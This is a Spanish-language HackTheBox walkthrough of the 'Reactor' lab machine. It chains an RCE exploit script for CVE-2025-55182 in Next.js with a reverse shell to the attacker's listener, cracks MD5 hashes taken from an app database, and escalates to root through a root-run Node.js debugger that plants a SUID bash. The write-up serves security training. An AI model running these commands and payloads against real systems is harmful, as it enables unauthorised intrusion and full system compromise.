# 🔬 HTB Reactor — Writeup
 
![HackTheBox](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Dificultad](https://img.shields.io/badge/Dificultad-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![Estado](https://img.shields.io/badge/Estado-Pwned-success?style=for-the-badge)
 
> ⚠️ **Aviso legal:** Este writeup es únicamente con fines educativos y fue realizado en un entorno controlado de HackTheBox. Aplicar estas técnicas fuera de entornos autorizados es ilegal.
 
---
 
## 📋 Tabla de contenidos
 
- [Resumen](#-resumen)
- [Reconocimiento](#-reconocimiento)
- [Explotación — CVE-2025-55182](#-explotación--cve-2025-55182)
- [Enumeración interna](#-enumeración-interna)
- [Acceso SSH — Flag de usuario](#-acceso-ssh--flag-de-usuario)
- [Escalada de privilegios](#-escalada-de-privilegios)
- [Conceptos clave](#-conceptos-clave)
- [Cadena de ataque](#-cadena-de-ataque)
---
 
## 🗺 Resumen
 
| Campo       | Detalle                                      |
|-------------|----------------------------------------------|
| Nombre      | Reactor                                      |
| Plataforma  | HackTheBox                                   |
| OS          | Linux (Ubuntu)                               |
| Dificultad  | Easy                                         |
| User flag   | ✅                                           |
| Root flag   | ✅                                           |
| CVE         | CVE-2025-55182 (Next.js RSC RCE)             |
 
---
 
## 🔍 Reconocimiento
 
```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.x.x -oG allPorts
nmap -sCV -p22,3000 10.129.x.x -oN targeted
```
 
**Puertos relevantes:**
 
| Puerto | Servicio | Detalle                    |
|--------|----------|----------------------------|
| 22     | SSH      | OpenSSH                    |
| 3000   | HTTP     | Next.js 15 (Node.js)       |
 
---
 
## 💥 Explotación — CVE-2025-55182
 
**Descripción:** Vulnerabilidad RCE sin autenticación en Next.js 15 que abusa de la deserialización de React Server Components (RSC). Permite ejecutar comandos arbitrarios en el servidor como el usuario que corre la aplicación.
 
### Verificar ejecución de comandos
 
```bash
python3 CVE-2025-55182-exploit.py http://10.129.x.x:3000 -c "id"
# uid=999(node) gid=988(node) groups=988(node)
```
 
### Obtener reverse shell
 
**Terminal 1 — listener:**
```bash
nc -lvnp 4444
```
 
**Terminal 2 — exploit:**
```bash
python3 CVE-2025-55182-exploit.py http://10.129.x.x:3000 --revshell 10.10.x.x 4444
```
 
### Estabilizar la shell
 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
 
---
 
## 🔎 Enumeración interna
 
### Archivos de la aplicación
 
```bash
ls /opt/reactor-app
# reactor.db  app  next.config.js  node_modules  package.json
```
 
### Extraer credenciales de reactor.db
 
```bash
strings reactor.db
```
 
Se obtienen dos hashes MD5:
 
| Usuario  | Hash MD5                           |
|----------|------------------------------------|
| engineer | `39d97110eafe2a9a68639812cd271e8e` |
| admin    | `a203b22191d744a4e70ada5c101b17b8` |
 
### Crackear con hashcat
 
```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt
echo "a203b22191d744a4e70ada5c101b17b8" >> hashes.txt
 
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -D 1,2
```
 
**Resultado:**
 
| Usuario  | Contraseña |
|----------|------------|
| engineer | `reactor1` |
| admin    | —          |
 
---
 
## 🚩 Acceso SSH — Flag de usuario
 
```bash
ssh engineer@10.129.x.x
# password: reactor1
 
cat ~/user.txt
```
 
---
 
## ⬆️ Escalada de privilegios
 
### 1. Enumerar puertos internos
 
```bash
ss -tulnp
```
 
Se identifica `127.0.0.1:9229` solo accesible desde localhost.
 
### 2. Identificar el proceso vulnerable
 
```bash
ps aux | grep node
# root  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
 
Un proceso Node corre como **root** con el debugger habilitado → permite ejecutar código JS arbitrario como root.
 
### 3. Port forwarding SSH
 
```bash
# Desde tu máquina, dejar esta terminal abierta
ssh -L 9229:127.0.0.1:9229 engineer@10.129.x.x
```
 
### 4. Verificar acceso al debugger
 
```bash
curl http://127.0.0.1:9229/json
```
 
### 5. Conectarse y ejecutar payload
 
```bash
node inspect 127.0.0.1:9229
```
 
En el prompt `debug>`:
 
```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/bash && chmod +s /tmp/bash').toString()")
```
 
### 6. Obtener shell como root
 
```bash
# Desde la sesión SSH de engineer
/tmp/bash -p
# bash-5.2#
 
cat /root/root.txt
```
 
---
 
## 📚 Conceptos clave
 
### CVE-2025-55182 — Next.js RSC RCE
Vulnerabilidad en React Server Components de Next.js 15. El servidor deserializa acciones enviadas por el cliente sin validación suficiente, permitiendo inyectar código arbitrario.
 
### Node.js `--inspect` como vector de escalada
Cuando un proceso Node corre como root con `--inspect` habilitado, el debugger acepta código JS arbitrario. El flujo de ataque es:
1. Port forwarding del puerto 9229 vía SSH
2. Conexión con `node inspect`
3. Ejecución de `child_process.execSync()` para crear un binario SUID
### Bit SUID
El bit SUID hace que un binario se ejecute con los permisos de su **propietario**, no del usuario que lo lanza.
```bash
chmod +s /tmp/bash      # asignar SUID
/tmp/bash -p            # -p preserva el euid del propietario (root)
```
 
### Port forwarding SSH
```bash
# Acceder a un puerto remoto como si fuera local
ssh -L PUERTO_LOCAL:HOST_REMOTO:PUERTO_REMOTO usuario@target
 
# Ejemplo de esta máquina
ssh -L 9229:127.0.0.1:9229 engineer@10.129.x.x
```
 
### Hashcat — modos más usados
 
| Modo    | Hash         |
|---------|--------------|
| `-m 0`  | MD5          |
| `-m 100`| SHA1         |
| `-m 1800`| SHA-512 (shadow) |
| `-m 3200`| bcrypt      |
| `-m 22000`| WPA2 PMKID |
 
---
 
## 🔗 Cadena de ataque
 
```
[RCE sin auth]
CVE-2025-55182 (Next.js 15)
        │
        ▼
[Shell como node]
/opt/reactor-app/reactor.db
        │
        ▼
[Hash MD5 → hashcat]
engineer : reactor1
        │
        ▼
[SSH] user.txt ✅
        │
        ▼
[Node --inspect en :9229 (root)]
SSH tunnel → node inspect → execSync()
        │
        ▼
[SUID bash]
/tmp/bash -p → root
        │
        ▼
[root.txt] ✅
```
 
---
 
## 🛠 Herramientas utilizadas
 
| Herramienta | Uso |
|-------------|-----|
| `nmap` | Reconocimiento de puertos |
| `feroxbuster - ffuf`  | Reconocimiento web |
| `CVE-2025-55182-exploit.py` | RCE en Next.js |
| `nc` | Reverse shell listener |
| `strings` / `sqlite3` | Extracción de credenciales |
| `hashcat` | Crackeo de hashes MD5 |
| `ssh -L` | Port forwarding |
| `node inspect` | Abuso del debugger de Node.js |
 
---
 
*Writeup realizado con fines educativos en HackTheBox.*
 

